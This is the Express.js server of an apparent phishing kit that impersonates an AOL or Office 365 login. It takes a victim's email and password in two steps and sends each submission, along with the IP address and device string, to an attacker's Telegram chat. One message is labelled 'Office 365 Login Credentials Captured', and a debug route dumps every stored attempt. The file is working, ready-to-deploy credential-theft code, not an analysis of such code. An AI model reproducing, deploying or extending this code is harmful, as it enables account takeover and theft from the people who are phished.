require("dotenv").config();
const express = require("express");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");
const cors = require("cors");

const app = express();
const port = process.env.PORT || 3000;

// ====================== IMPORTANT: Trust Proxy for Railway ======================
app.set('trust proxy', true);   // ← This line is crucial when running on Railway / behind proxies

// ====================== CORS SETUP ======================
app.use(cors({
  origin: [
    "http://localhost:3000",
    "http://localhost:3001",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:3001",
    "http://127.0.0.1:5173",
    "https://login-aol.vercel.app"
    // Add your deployed frontend URL here later
  ],
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: false
}));

app.use(express.json());

// ====================== TELEGRAM SETUP ======================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env");
  process.exit(1);
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    });
    console.log("✅ Sent to Telegram");
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

// Store attempts
const loginAttempts = new Map();

// Helper to get clean IP address
function getClientIP(req) {
  return req.ip ||
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    "Unknown";
}

// ====================== STEP 1: Submit Email ======================
app.post("/api/submit-email", async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  const attemptId = uuidv4();
  const ipAddress = getClientIP(req);
  const userAgent = req.get("User-Agent") || "Unknown";

  loginAttempts.set(attemptId, {
    email,
    ipAddress,
    userAgent,
    timestamp: new Date().toISOString(),
  });

  await sendToTelegram(
    `🏋️‍♂️ *New Email Login Attempt*\n\n` +
    `📧 *Email:* ${email}\n` +
    `🌐 *IP Address:* \`${ipAddress}\`\n` +
    `📱 *Device:* ${userAgent.slice(0, 120)}${userAgent.length > 120 ? "..." : ""}\n` +
    `⏳ Waiting for password...\n` +
    `🔑 ID: \`${attemptId.slice(0, 8)}\``
  );

  res.json({
    status: "success",
    message: "Email received. Please enter password.",
    attemptId,
  });
});

// ====================== STEP 2: Submit Password ======================
app.post("/api/submit-password", async (req, res) => {
  const { attemptId, password } = req.body;

  if (!attemptId || !password) {
    return res.status(400).json({ error: "attemptId and password required" });
  }

  const attempt = loginAttempts.get(attemptId);
  if (!attempt) {
    return res.status(404).json({ error: "Invalid attempt ID" });
  }

  attempt.password = password;

  await sendToTelegram(
    `✅ *Office 365 Login Credentials Captured*\n\n` +
    `📧 *Email:* ${attempt.email}\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `🌐 *IP Address:* \`${attempt.ipAddress}\`\n` +
    `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
    `⏰ *Time:* ${new Date().toISOString()}`
  );

  res.json({ status: "success", message: "Done" });
});

// Debug route
app.get("/api/debug", (req, res) => {
  res.json(Array.from(loginAttempts.entries()));
});

app.listen(port, () => {
  console.log(`🚀 Server running on port ${port}`);
  console.log("✅ IP capturing enabled (trust proxy = true)");
});
